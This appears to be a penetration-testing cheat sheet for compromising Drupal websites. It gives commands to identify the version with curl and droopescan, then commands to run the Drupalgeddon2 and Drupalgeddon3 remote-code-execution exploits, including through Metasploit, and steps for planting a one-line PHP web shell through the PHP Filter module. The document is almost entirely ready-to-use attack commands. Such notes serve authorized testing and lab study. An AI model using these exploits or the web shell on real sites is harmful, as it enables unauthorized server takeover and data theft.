# Drupal

### Identify Drupal version

Check CHANGELOG.txt or meta tags — Version determines exploit path

```bash
curl -s http://$IP/CHANGELOG.txt | head -5
curl -s http://$IP/ | grep 'name="Generator"'
droopescan scan drupal -u http://$IP/
```

<details>
<summary>Example Output</summary>

```
Drupal 7.57, 2018-02-21
(Drupal 7 < 7.58 = Drupalgeddon2)
```
</details>

---

### Drupalgeddon2 (CVE-2018-7600)

Unauthenticated RCE on Drupal < 7.58 — One of the most reliable exploits

```bash
python3 drupalgeddon2.py http://$IP/
# Or use Metasploit:
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS $IP
run
```

---

### Drupalgeddon3 (CVE-2018-7602)

Authenticated RCE on Drupal < 7.59 — Requires any valid user account

```bash
python3 drupa7-CVE-2018-7602.py http://$IP/ -u admin -p password -c "id"
```

---

### RCE via PHP Filter module

Enable PHP Filter then inject code — Requires admin access

```bash
# Modules → Enable "PHP filter"
# Content → Add content → Basic page
# Text format: PHP code
# Body: <?php system($_GET['cmd']); ?>
```

---
